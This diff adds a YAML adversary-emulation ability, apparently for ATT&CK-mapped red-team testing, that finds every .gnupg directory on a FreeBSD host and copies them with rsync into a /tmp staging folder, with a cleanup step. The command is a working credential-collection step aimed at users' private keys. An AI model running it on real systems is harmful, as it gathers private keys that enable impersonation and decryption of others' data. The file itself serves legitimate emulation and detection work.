@@ -1,0 +1,19 @@
+---
+- id: bd0ba967b5e82c16abf8377689fec96c
+  name: Copy the users GnuPG directory with rsync (freebsd)
+  description: 'Copy the users GnuPG (.gnupg) directory on a FreeBSD system to a staging
+    folder using the `rsync` command.
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1552.004
+    name: 'Unsecured Credentials: Private Keys'
+  platforms:
+    linux:
+      sh:
+        command: 'if [ ! -x "$(command -v rsync)" ]; then (which pkg && pkg install
+          -y rsync); fi;  mkdir /tmp/GnuPG; find / -type d -name ''.gnupg'' 2>/dev/null
+          -exec rsync -Rr {} /tmp/GnuPG \; '
+        payloads: []
+        cleanup: rm -rf /tmp/GnuPG
